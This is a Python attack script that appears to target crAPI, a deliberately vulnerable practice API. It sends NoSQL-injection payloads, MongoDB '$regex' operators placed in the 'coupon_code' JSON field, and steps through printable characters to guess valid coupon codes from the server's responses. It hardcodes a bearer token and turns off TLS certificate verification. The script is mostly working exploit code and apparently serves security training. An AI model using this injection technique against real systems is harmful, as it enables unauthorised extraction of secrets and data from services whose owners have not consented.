import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

# Find a match using a regex from string.printable chars

code=""
u="http://crapi.app/community/api/v2/coupon/validate-coupon"
headers={'content-type': 'application/json', "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzb21lQHNvbWUuY29tIiwiaWF0IjoxNzQ1NTE5NzA4LCJleHAiOjE3NDYxMjQ1MDgsInJvbGUiOiJ1c2VyIn0.OrnzqdvowUB06l1sUd1_oVOe9vAhCfm1lIaAKDI3ZdreL4xMU2Cty18UHCw1w8AHcnbVKIfAoU6PyjlmKiAlEd8JxgxNWQJdeY2M_s4XxbpW8byD9oOcgThUKo3VVQ_Xo8875zuG97-29ctuqCxP2OPYfZLpunKG8MVq3FWTOvQrLQhEJOzxSw5tYw74lXa1lVnFDkiiwptDNzNNdIsWP1Y8fULn6i909gD1kDNulFiL0OA7x6m3qJu1vskYNJfYhooy5sgWT-l4CmY4smLOfmAx7ONQEdmBSFJFRyCOdIr02mxLZsVvb_ZPk_dQy9Ly5f8Jo6NMXgf8khNKseEbdQ"}

for c in string.printable:
    if c not in ['*','+','.','?','|']:
        payload='{"coupon_code": {"$regex": "^%s" }}' % (code + c)
        r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
        if r.text.strip() not in ["{}", "", "null"]:
            print(">>>> %s" % (r.text))
